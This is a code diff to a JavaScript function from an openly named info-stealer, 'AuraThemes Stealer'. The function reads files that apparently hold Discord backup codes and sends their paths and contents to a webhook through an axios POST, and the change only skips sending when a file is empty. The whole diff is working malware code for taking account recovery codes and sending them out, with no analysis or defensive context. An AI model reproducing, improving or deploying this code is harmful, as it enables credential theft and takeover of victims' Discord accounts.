@@ -55,37 +55,40 @@ function searchFiles(dir, webhook) {
                                         resolve(false);
                                         return;
                                     }
-
-                                    const payload = {
-                                        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-                                        username: 'AuraThemes Stealer - Codes',
-                                        content: `\`${filePath}\``,
-                                        embeds: [
-                                            {
-                                                title: 'Discord Backup Codes',
-                                                color: "12740607",
-                                                description: `\`\`\`yml\n${data.length === 0 ? 'Not found' : data}\n\`\`\``,
-                                                timestamp: new Date(),
-                                                footer: {
-                                                    text: 'AuraThemes Stealer',
-                                                    icon_url: 'https://i.imgur.com/yVnOSeS.gif'
+                                    if (data.length > 0) {
+                                        const payload = {
+                                            avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
+                                            username: 'AuraThemes Stealer - Codes',
+                                            content: `\`${filePath}\``,
+                                            embeds: [
+                                                {
+                                                    title: 'Discord Backup Codes',
+                                                    color: "12740607",
+                                                    description: `\`\`\`yml\n${data.length === 0 ? 'Not found' : data}\n\`\`\``,
+                                                    timestamp: new Date(),
+                                                    footer: {
+                                                        text: 'AuraThemes Stealer',
+                                                        icon_url: 'https://i.imgur.com/yVnOSeS.gif'
+                                                    }
                                                 }
-                                            }
-                                        ]
-                                    };
+                                            ]
+                                        };
 
-                                    try {
-                                        const form = new FormData();
-                                        form.append('payload_json', JSON.stringify(payload));
+                                        try {
+                                            const form = new FormData();
+                                            form.append('payload_json', JSON.stringify(payload));
 
-                                        await axios.post(webhook, form, {
-                                            headers: {
-                                                ...form.getHeaders()
-                                            }
-                                        });
-                                        resolve(true);
-                                    } catch (error) {
-                                        console.error("Could not send codes with webhook:", error);
+                                            await axios.post(webhook, form, {
+                                                headers: {
+                                                    ...form.getHeaders()
+                                                }
+                                            });
+                                            resolve(true);
+                                        } catch (error) {
+                                            console.error("Could not send codes with webhook:", error);
+                                            resolve(false);
+                                        }
+                                    } else {
                                         resolve(false);
                                     }
                                 });
